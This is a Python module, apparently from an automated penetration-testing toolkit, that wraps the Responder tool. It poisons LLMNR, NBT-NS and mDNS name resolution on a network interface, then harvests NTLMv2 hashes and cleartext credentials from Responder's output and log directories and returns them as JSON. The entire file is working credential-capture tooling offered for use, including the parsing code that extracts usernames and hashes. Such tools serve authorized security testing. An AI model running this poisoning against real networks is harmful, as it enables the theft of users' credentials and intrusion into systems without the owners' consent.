#!/usr/bin/env python3
"""
responder_poisoner — LLMNR/NBT-NS/mDNS poisoning via Responder.

Source: PentAGI CLI tool wrapper (vxcontrol/kali-linux bundle).
CLI deps: responder (installed on Kali at /usr/sbin/responder)

Captures NTLMv2 hashes by poisoning name resolution protocols.
Supports analyze-only mode (passive hash capture without poisoning).

REQUIRES: Root privileges (Responder binds to privileged ports).
"""

import json
import os
import re
import signal
import time

from base_module import TacticalModule


class ResponderPoisoner(TacticalModule):
    name = "responder_poisoner"
    description = "LLMNR/NBT-NS/mDNS poisoning via Responder"

    def _add_module_args(self) -> None:
        self.parser.add_argument(
            "--interface", required=True,
            help="Network interface to listen on",
        )
        self.parser.add_argument(
            "--analyze-only",
            action="store_true",
            help="Analyze mode — capture hashes without active poisoning",
        )
        self.parser.add_argument(
            "--duration",
            type=int, default=60,
            help="Capture duration in seconds (default: 60)",
        )

    def run(self, args) -> None:
        if not self.validate_interface(args.interface):
            self.output_error(f"Invalid interface name: {args.interface}")
            return

        if not self.check_interface_exists(args.interface):
            self.output_error(f"Interface {args.interface} does not exist")
            return

        if os.geteuid() != 0:
            self.output_error(
                "Responder requires root privileges. Run with sudo."
            )
            return

        # Build responder command
        resp_args = ["-I", args.interface, "-v"]

        if args.analyze_only:
            resp_args.append("-A")  # Analyze mode

        # Responder runs indefinitely — we need to kill it after duration
        import subprocess

        start = time.monotonic()
        self.logger.info("Starting Responder for %ds (analyze=%s)", args.duration, args.analyze_only)

        proc = subprocess.Popen(
            ["responder"] + resp_args,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            preexec_fn=os.setsid,  # New process group for clean kill
        )

        # Wait for the specified duration
        try:
            stdout, stderr = proc.communicate(timeout=args.duration)
        except subprocess.TimeoutExpired:
            # Expected — kill the process group
            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
            try:
                stdout, stderr = proc.communicate(timeout=5)
            except subprocess.TimeoutExpired:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                stdout, stderr = proc.communicate(timeout=5)

        duration_ms = int((time.monotonic() - start) * 1000)

        # Parse captured hashes from stdout and Responder log files
        captured_hashes = self._parse_hashes(stdout)

        # Also check Responder's log directory
        log_hashes = self._check_responder_logs()
        for h in log_hashes:
            if h not in captured_hashes:
                captured_hashes.append(h)

        self.log_run(
            args.db_path, self.name,
            json.dumps(vars(args), default=str),
            0, stdout[:5000], stderr[:5000], duration_ms,
        )

        self.output_success({
            "interface": args.interface,
            "analyze_only": args.analyze_only,
            "captured_hashes": captured_hashes,
            "hash_count": len(captured_hashes),
            "duration_ms": duration_ms,
        })

    @staticmethod
    def _parse_hashes(stdout: str) -> list[dict]:
        """Parse Responder stdout for captured hashes."""
        hashes: list[dict] = []

        for line in stdout.split("\n"):
            # NTLMv2 hash format in Responder output:
            # [SMB] NTLMv2-SSP Client : 192.168.1.10
            # [SMB] NTLMv2-SSP Username : DOMAIN\user
            # [SMB] NTLMv2-SSP Hash : user::DOMAIN:...

            hash_match = re.search(
                r"\[(\w+)\]\s+NTLMv\d+-SSP\s+Hash\s*:\s*(.+)",
                line,
            )
            if hash_match:
                protocol = hash_match.group(1)
                hash_value = hash_match.group(2).strip()

                # Parse the hash to extract username and domain
                parts = hash_value.split(":")
                username = parts[0] if parts else ""

                hashes.append({
                    "protocol": protocol,
                    "hash_type": "NTLMv2",
                    "username": username,
                    "hash": hash_value[:200],
                })

            # Also catch cleartext credentials
            cleartext_match = re.search(
                r"\[(\w+)\]\s+(?:Cleartext|HTTP)\s+(?:Password|Credentials?)\s*:\s*(.+)",
                line,
            )
            if cleartext_match:
                hashes.append({
                    "protocol": cleartext_match.group(1),
                    "hash_type": "cleartext",
                    "username": "",
                    "hash": cleartext_match.group(2).strip()[:200],
                })

        return hashes

    @staticmethod
    def _check_responder_logs() -> list[dict]:
        """Check Responder's log directory for captured hashes."""
        hashes: list[dict] = []
        log_dirs = ["/usr/share/responder/logs", "/opt/responder/logs"]

        for log_dir in log_dirs:
            if not os.path.isdir(log_dir):
                continue

            for fname in os.listdir(log_dir):
                if not fname.endswith(".txt"):
                    continue

                # Extract protocol from filename (e.g., SMB-NTLMv2-SSP-...)
                protocol = fname.split("-")[0] if "-" in fname else "unknown"

                filepath = os.path.join(log_dir, fname)
                try:
                    mtime = os.path.getmtime(filepath)
                    # Only include files modified in the last 5 minutes
                    if time.time() - mtime > 300:
                        continue

                    with open(filepath) as f:
                        for line in f:
                            line = line.strip()
                            if line and "::" in line:
                                parts = line.split(":")
                                hashes.append({
                                    "protocol": protocol,
                                    "hash_type": "NTLMv2",
                                    "username": parts[0] if parts else "",
                                    "hash": line[:200],
                                })
                except OSError:
                    continue

        return hashes


if __name__ == "__main__":
    ResponderPoisoner().execute()
